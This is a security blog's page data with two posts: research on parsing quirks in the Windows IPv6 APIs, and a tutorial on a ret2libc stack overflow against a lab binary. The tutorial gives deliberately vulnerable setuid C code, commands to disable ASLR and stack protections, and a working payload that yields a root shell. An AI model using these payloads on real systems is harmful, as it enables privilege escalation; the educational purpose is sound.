{"pageProps":{"allTags":{"biohacking":"biohacking","buffer-overflow":"buffer overflow","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","how-to":"how to","ipv6":"IPv6","makefile":"Makefile","memory":"memory","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","story":"Story","tutorial":"Tutorial","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"posts":[{"title":"Quirks in the Windows IPv6 address parsing and printing APIs","slug":"quirks-in-the-windows-ipv6-address-parsing-and-printing-apis","date_published":1607041080000,"date_updated":1607041080000,"tags":["research","WINDOWS API","IPv6"],"excerpt":"Half of the world still lacks Internet access, but there are no IPv4 addresses left to hand out - which means that software libraries for IPv6 deserve scrutiny now.","cover":"2020/12/ipv6_sticker.jpg","author":{"name":"Alex Henrie","avatar":"avatars/alexhenrie.png"},"content":"\n[Half of the world still lacks Internet access](https://en.wikipedia.org/wiki/Global_Internet_usage#Internet_users), but [there are no IPv4 addresses left to hand out](https://ipv4.potaroo.net/). On the other hand, [33% of Google's customer base has a working IPv6 connection now](https://www.google.com/intl/en/ipv6/statistics.html ) and [Apple is pushing developers to switch just for the performance benefits](https://www.zdnet.com/article/apple-tells-app-devs-to-use-ipv6-as-its-1-4-times-faster-than-ipv4/). It's clear that IPv6 will be increasingly important as time goes on, which means that software libraries for IPv6 deserve scrutiny now.\n\nMicrosoft Windows has accumulated numerous API functions for converting IPv6 addresses from text to binary (parsing) and from binary to text (printing), including:\n\n*   [iphlpapi.ParseNetworkString](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-parsenetworkstring)\n*   [ws2\\_32.inet\\_ntop](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton)\n*   [ws2\\_32.InetNtopW](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetntopw)\n*   [ws2\\_32.inet\\_pton](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton)\n*   [ws2\\_32.InetPtonW](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetptonw)\n*   [ws2\\_32.WSAAddressToStringA](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaaddresstostringa)\n*   [ws2\\_32.WSAAddressToStringW](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaaddresstostringw)\n*   [urlmon.CreateUri](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)) (string normalization only)\n*   dnsapi.DnsIpv6AddressToString (undocumented)\n*   dnsapi.DnsIpv6StringToAddress (undocumented)\n\nHowever, all of these functions behave identically to, and are surely built upon, the following:\n\n*   [ntdll.RtlIpv6AddressToStringA](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringa)\n*   [ntdll.RtlIpv6AddressToStringW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringw)\n*   ntdll.RtlIpv6AddressToStringExA (not explicitly documented)\n*   [ntdll.RtlIpv6AddressToStringExW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringexw)\n*   [ntdll.RtlIpv6StringToAddressA](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressa)\n*   [ntdll.RtlIpv6StringToAddressW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressw)\n*   ntdll.RtlIpv6StringToAddressExA (not explicitly documented)\n*   [ntdll.RtlIpv6StringToAddressExW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressexw)\n\nThe two RtlIpv6AddressToString functions only print plain IPv6 addresses. The _Ex_ suffix in the RtlIpv6AddressToStringEx functions indicates that they were added later, and they can print addresses with or without a network interface number or port.\n\nLikewise, the RtlIpv6StringToAddress functions are older and can only parse plain IPv6 addresses. They report the _terminator_ via a pointer argument, the terminator being the first unparsable character in the input string. The newer RtlIpv6StringToAddressEx functions can, in addition to parsing unadorned addresses, parse text that includes a network interface number or port. Furthermore, the Ex functions are more strict about what they accept than the originals: They do not report the terminator because they just return an error code if the address does not end at the end of the string.\n\nThis year (2020), I [implemented all eight of those ntdll functions for Wine](https://source.winehq.org/git/wine.git/blob/bedfb9cae224a369efa4588332a5518dbee57035:/dlls/ntdll/rtl.c#l1091) from scratch, knowing nothing about how the Windows implementations are coded. I tested millions of string inputs to determine exactly what counts as an IPv6 address in Windows, and in the process found some interesting quirks that could lead to security vulnerabilities in Windows software.\n\n## RtlIpv6StringToAddress(Ex) might give you the wrong address\n\nIn a spec-conformant IPv6 address parser, a `::` [represents two or more bytes of zeros](https://tools.ietf.org/html/rfc4291#section-2.2). In the Windows APIs, this is only true if the double colon is in the middle or at the end of the address: If it comes at the beginning, it counts as at least four bytes of zeros. For example, if the address `::1` were written as `::0:0:0:0:0:0:0:1` (perfectly valid according to the spec), RtlIpv6StringToAddress reports that the terminator is the last `:` instead of the null terminator `\\0` and it returns `STATUS_SUCCESS`. RtlIpv6StringToAddressEx is better because it returns the error code `STATUS_INVALID_PARAMETER` instead. Nevertheless, both functions fill the address buffer with the parsed address, minus two bytes at the end and plus two zero bytes at the beginning. In this example, the binary address that is stored will be `::` instead of `::1`. If the calling program does not check for errors thoroughly, this defect could expose sensitive data by causing server software to bind to `::` (all addresses) instead of `::1` (localhost only).\n\nThe fact that Windows fails to parse some valid addresses is a compelling reason to avoid using the Windows IPv6 parsing APIs altogether, since differences between how IPv6 implementations output and interpret addresses can lead to software incompatibility. I felt that this was such a glaring problem that I wrote to Microsoft Security about it in January 2020, but because they did not consider it to be a significant security issue, it has yet to be fixed.\n\n## RtlIpv6AddressToString writes past the null terminator\n\nRtlIpv6AddressToString always zeroes out the 46th character of the buffer, even though the longest possible normalized native IPv6 address is only 39 characters:\n\n`1111:2222:3333:4444:5555:6666:7777:8888`\n\nIf the input is an [ISATAP](https://en.wikipedia.org/wiki/ISATAP) address (indicated by `0` or `200` in the fifth component and `5efe` in the sixth component), the longest possible normalized address increases to 44 characters in length, which is still one less than 45:\n\n`1111:2222:3333:4444:200:5efe:255.255.255.255`\n\nOverwriting the 46th character could cause a buffer overflow if the function is given an output buffer of less than 46 characters. The problem was fixed in RtlIpv6AddressToStringEx, which writes the minimum number of characters necessary.\n\n## RtlIpv6StringToAddress does not limit the length of the last component\n\n[An IPv6 address is invalid if any of its components are longer than four digits](https://tools.ietf.org/html/rfc4291#section-2.2) (even if the extra digits are just leading zeros). And since IPv6 address components are hexadecimal by default, there's no prefix like `0x` to switch from decimal to hexadecimal. However, RtlIpv6AddressToString waives the length requirement for the last component if it is prefixed with `0x`, for example:\n\n`::0x9999999999999999999999999999999999999999999999999999999999999999999999abcd`\n\nNo matter how long the last component is, if it starts with `0x` and contains only hexadecimal digits, the value is taken from the last four digits (`::abcd` in this example), the terminator is set to the `x`, and `STATUS_SUCCESS` is returned. This could result in a buffer overflow if an address that RtlIpv6AddressToString validates is assumed to be 45 characters or less and then copied to a 45-character buffer. The problem is more or less fixed in RtlIpv6StringToAddressEx, which returns `STATUS_INVALID_PARAMETER` if it encounters a `0x`, although it still parses and saves the value following the `0x` in the same way as RtlIpv6StringToAddress.\n\n## Best practices\n\nWith all of the above in mind, here's what I recommend:\n\n*   For the sake of interoperability, avoid the Windows IPv6 parsing APIs if possible. Use an external library such as [ipv6-parse](https://github.com/jrepp/ipv6-parse) instead.\n*   If you do use the Windows IPv6 parsing or printing APIs, always use the Ex functions instead of the older ones.\n*   Check the return value of RtlIpv6StringToAddressEx for errors, even if you have already validated the IPv6 address with a spec-conformant parser.\n\nHappy coding! And if you're not already using [Wine](https://www.winehq.org/), be sure to check out the Wine 6.0 release (I'll be calling it \"Wine Vista\") which is due out at the beginning of next year. Apart from improved IPv6 support, compatibility with popular Windows software has taken an enormous step forward since Wine 5.0 thanks to an overhauled software architecture and tighter integration with MinGW.\n\nPhoto credit: [Phil Wolff](https://www.flickr.com/photos/philwolff/5557354098/in/photolist-9t5TKY-jKi9BZ-reZriP-csBi4j-bozscb-5XWDVu-8qdoiy-9GWxX7-cc8j1J-ost5VM-cj45H5-7FQyVD-5XWDVm-58Zu4e-nQ4nF5-nxHJA4-d8vfpA-nxHH9r-8qdobj-9TExeZ-bvov6x-5NtZnq-7yQMwe-cCjXzo-4qQ54q-48dbjJ-23s1XwA-GxGQpg-brFDWM-bdQpKT-bdPJ1F-brEEDH-2h3Jv9-c2pZVE-bdQgai-nEho6E-9UfTM8-bdQ3N4-6QdWkz-aousCH-kwkHqE-bdQeyz-brEEzR-9QT9bn-9THsMQ-bdQ6Xa-bdQaA4-brFJoP-bdPQki-bdPM64)"},{"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov 